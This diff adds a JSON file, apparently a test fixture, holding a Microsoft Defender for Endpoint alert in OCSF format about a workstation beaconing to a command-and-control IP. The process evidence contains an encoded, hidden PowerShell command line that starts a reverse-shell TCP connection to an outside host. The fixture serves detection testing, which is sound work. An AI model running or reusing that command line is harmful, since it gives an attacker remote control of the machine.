@@ -1,0 +1,304 @@
+{
+    "finding_info": {
+        "uid": "placeholder_uid",
+        "title": "Defender for Endpoint - Outbound connection to known command-and-control server",
+        "desc": "powershell.exe on ws-fin-042.contoso.corp established an outbound TCP connection to 195.201.59.127:4443, a known command-and-control infrastructure node. The connecting process was spawned from cmd.exe with an obfuscated, base64-encoded command line consistent with the Bovter reverse-shell pattern. The destination IP is geolocated to DE (ASN 24940). MITRE ATT&CK: T1071.001 (Web Protocols), T1095 (Non-Application Layer Protocol), T1573 (Encrypted Channel).",
+        "src_url": "https://security.microsoft.com/alerts/cf9f8e7d-6c5b-4a39-2817-1605f4e3d2c1",
+        "related_events": [
+            {
+                "uid": "ws-fin-042.contoso.corp (1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081): malicious",
+                "message": "ws-fin-042.contoso.corp (1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081): malicious"
+            },
+            {
+                "uid": "195.201.59.127 (ipEvidence): malicious",
+                "message": "Outbound C2 IP 195.201.59.127:4443 (ipEvidence): malicious"
+            },
+            {
+                "uid": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2 (mdeDeviceId): malicious",
+                "message": "processEvidence powershell.exe on mdeDeviceId 47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2: malicious"
+            },
+            {
+                "uid": "contoso (a8f3b1d2-7e4c-49a0-b5d8-2c3e4f5a6b71): suspicious",
+                "message": "userEvidence alex.morgan@contoso.com: suspicious"
+            }
+        ]
+    },
+    "resources": [
+        {
+            "uid": "DYNAMIC_RESOURCE_UID",
+            "name": "ws-fin-042.contoso.corp",
+            "type": "Windows11",
+            "version": "10.0.22631.3737",
+            "owner": {
+                "email_addr": "alex.morgan"
+            }
+        }
+    ],
+    "observables": [
+        {
+            "name": "azureAdDeviceId",
+            "type": "Resource UID",
+            "type_id": 10,
+            "value": "1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081"
+        },
+        {
+            "name": "ipInterfaces",
+            "type": "IP Address",
+            "type_id": 2,
+            "value": "10.84.17.42"
+        },
+        {
+            "name": "osPlatform",
+            "type": "Endpoint",
+            "type_id": 20,
+            "value": "Windows11"
+        },
+        {
+            "name": "loggedOnUsers",
+            "type": "User",
+            "type_id": 21,
+            "value": "alex.morgan"
+        },
+        {
+            "name": "ipAddress",
+            "type": "IP Address",
+            "type_id": 2,
+            "value": "195.201.59.127"
+        },
+        {
+            "name": "mdeDeviceId",
+            "type": "Resource UID",
+            "type_id": 10,
+            "value": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2"
+        },
+        {
+            "name": "processId",
+            "type": "Process",
+            "type_id": 25,
+            "value": "10284"
+        }
+    ],
+    "evidences": [
+        {
+            "process": {
+                "cmd_line": "powershell.exe -nop -w hidden -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADUALgAyADAAMQAuADUAOQAuADEAMgA3ACIALAA0ADQA0ADMAKQA=",
+                "parent_process": {
+                    "name": "cmd.exe"
+                },
+                "user": {
+                    "name": "alex.morgan@contoso.com"
+                },
+                "file": {
+                    "name": "powershell.exe",
+                    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                    "size": 452608,
+                    "hashes": [
+                        {
+                            "algorithm_id": 2,
+                            "algorithm": "SHA-1",
+                            "value": "3f0d8e7c6b5a4938271605f4e3d2c1b0a9887654"
+                        },
+                        {
+                            "algorithm_id": 3,
+                            "algorithm": "SHA-256",
+                            "value": "9f8e7d6c5b4a3928171605f4e3d2c1b0a98876541a2b3c4d5e6f7a8b9c0d1e2f"
+                        }
+                    ]
+                }
+            }
+        }
+    ],
+    "severity": "high",
+    "severity_id": 4,
+    "activity_id": 1,
+    "category_uid": 2,
+    "category_name": "Findings",
+    "class_uid": 99602001,
+    "class_name": "S1 Security Alert",
+    "type_uid": 9960200101,
+    "type_name": "S1 Security Alert: Create",
+    "attack_surface_ids": [
+        1
+    ],
+    "s1_classification_id": 28,
+    "dataSource": {
+        "name": "Microsoft O365",
+        "category": "security",
+        "vendor": "Microsoft"
+    },
+    "cloud": {
+        "provider": "Microsoft Azure"
+    },
+    "metadata": {
+        "version": "1.1.0",
+        "product": {
+            "name": "Microsoft Defender for Endpoint",
+            "vendor_name": "Microsoft"
+        },
+        "logged_time": "DYNAMIC",
+        "modified_time": "DYNAMIC",
+        "extension": {
+            "name": "s1",
+            "uid": "998",
+            "version": "0.1.0"
+        }
+    },
+    "time": "DYNAMIC",
+    "raw_data": "DYNAMIC",
+    "additional_data": {
+        "graph_alert": {
+            "@odata.type": "#microsoft.graph.security.alert",
+            "id": "cf9f8e7d-6c5b-4a39-2817-1605f4e3d2c1",
+            "providerAlertId": "da637551227677561104_-961444814",
+            "incidentId": "28293",
+            "incidentWebUrl": "https://security.microsoft.com/incidents2/28293",
+            "alertWebUrl": "https://security.microsoft.com/alerts/cf9f8e7d-6c5b-4a39-2817-1605f4e3d2c1",
+            "title": "Outbound connection to a known command-and-control server",
+            "description": "powershell.exe established an outbound TCP connection to 195.201.59.127:4443, a known command-and-control infrastructure node, consistent with the Bovter reverse-shell pattern.",
+            "category": "CommandAndControl",
+            "severity": "high",
+            "status": "new",
+            "classification": "unknown",
+            "determination": "unknown",
+            "serviceSource": "microsoftDefenderForEndpoint",
+            "detectionSource": "smartScreen",
+            "detectorId": "0f3fb812-4f4d-42e4-aebd-3b3a8d5bf1f1",
+            "productName": "Microsoft Defender for Endpoint",
+            "tenantId": "b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
+            "actorDisplayName": null,
+            "threatDisplayName": "Backdoor:PowerShell/Bovter.A",
+            "threatFamilyName": "Bovter",
+            "mitreTechniques": [
+                "T1071.001",
+                "T1095",
+                "T1573"
+            ],
+            "systemTags": [
+                "NetworkProtection"
+            ],
+            "comments": [],
+            "createdDateTime": "DYNAMIC",
+            "lastUpdateDateTime": "DYNAMIC",
+            "resolvedDateTime": null,
+            "firstActivityDateTime": "DYNAMIC",
+            "lastActivityDateTime": "DYNAMIC",
+            "additionalData": {
+                "RemoteIP": "195.201.59.127",
+                "RemotePort": 4443,
+                "Protocol": "TCP",
+                "Country": "DE",
+                "ASN": 24940
+            },
+            "recommendedActions": "1. Isolate the device from the network. 2. Block 195.201.59.127:4443 at the perimeter and EDR. 3. Hunt for additional hosts beaconing to the same indicator. 4. Reset credentials for any user who logged on to the affected host.",
+            "evidence": [
+                {
+                    "@odata.type": "#microsoft.graph.security.deviceEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "malicious",
+                    "remediationStatus": "none",
+                    "roles": [
+                        "compromised"
+                    ],
+                    "detailedRoles": [],
+                    "tags": [],
+                    "mdeDeviceId": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2",
+                    "azureAdDeviceId": "1f2e3d4c-5b6a-7980-1a2b-3c4d5e6f7081",
+                    "deviceDnsName": "ws-fin-042.contoso.corp",
+                    "osPlatform": "Windows11",
+                    "osBuild": 22631,
+                    "version": "10.0.22631.3737",
+                    "healthStatus": "active",
+                    "riskScore": "high",
+                    "ipInterfaces": [
+                        "10.84.17.42"
+                    ],
+                    "vmMetadata": null,
+                    "loggedOnUsers": [
+                        {
+                            "accountName": "alex.morgan",
+                            "domainName": "contoso"
+                        }
+                    ]
+                },
+                {
+                    "@odata.type": "#microsoft.graph.security.ipEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "malicious",
+                    "remediationStatus": "blocked",
+                    "remediationStatusDetails": "Outbound connection blocked by Network Protection",
+                    "roles": [
+                        "attackerInfrastructure"
+                    ],
+                    "detailedRoles": [
+                        "destination"
+                    ],
+                    "tags": [
+                        "C2"
+                    ],
+                    "ipAddress": "195.201.59.127",
+                    "countryLetterCode": "DE"
+                },
+                {
+                    "@odata.type": "#microsoft.graph.security.processEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "malicious",
+                    "remediationStatus": "remediated",
+                    "roles": [
+                        "compromised"
+                    ],
+                    "detailedRoles": [],
+                    "tags": [],
+                    "mdeDeviceId": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2",
+                    "processId": 10284,
+                    "parentProcessId": 9847,
+                    "processCommandLine": "powershell.exe -nop -w hidden -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADUALgAyADAAMQAuADUAOQAuADEAMgA3ACIALAA0ADQA0ADMAKQA=",
+                    "processCreationDateTime": "DYNAMIC",
+                    "parentProcessCreationDateTime": "DYNAMIC",
+                    "detectionStatus": "detected",
+                    "imageFile": {
+                        "sha1": "3f0d8e7c6b5a4938271605f4e3d2c1b0a9887654",
+                        "sha256": "9f8e7d6c5b4a3928171605f4e3d2c1b0a98876541a2b3c4d5e6f7a8b9c0d1e2f",
+                        "fileName": "powershell.exe",
+                        "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                        "fileSize": 452608,
+                        "filePublisher": "Microsoft Corporation",
+                        "signer": "Microsoft Windows",
+                        "issuer": "Microsoft Windows Production PCA 2011"
+                    },
+                    "parentProcessImageFile": {
+                        "fileName": "cmd.exe",
+                        "filePath": "C:\\Windows\\System32",
+                        "sha1": "0a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3"
+                    },
+                    "userAccount": {
+                        "accountName": "alex.morgan",
+                        "domainName": "contoso",
+                        "userPrincipalName": "alex.morgan@contoso.com",
+                        "userSid": "S-1-5-21-1004336348-1177238915-682003330-1284",
+                        "azureAdUserId": "a8f3b1d2-7e4c-49a0-b5d8-2c3e4f5a6b71"
+                    }
+                },
+                {
+                    "@odata.type": "#microsoft.graph.security.userEvidence",
+                    "createdDateTime": "DYNAMIC",
+                    "verdict": "suspicious",
+                    "remediationStatus": "none",
+                    "roles": [
+                        "compromised"
+                    ],
+                    "detailedRoles": [],
+                    "tags": [],
+                    "userAccount": {
+                        "accountName": "alex.morgan",
+                        "domainName": "contoso",
+                        "userPrincipalName": "alex.morgan@contoso.com",
+                        "userSid": "S-1-5-21-1004336348-1177238915-682003330-1284",
+                        "azureAdUserId": "a8f3b1d2-7e4c-49a0-b5d8-2c3e4f5a6b71"
+                    },
+                    "stream": null
+                }
+            ]
+        }
+    },
+    "state_id": 1
+}
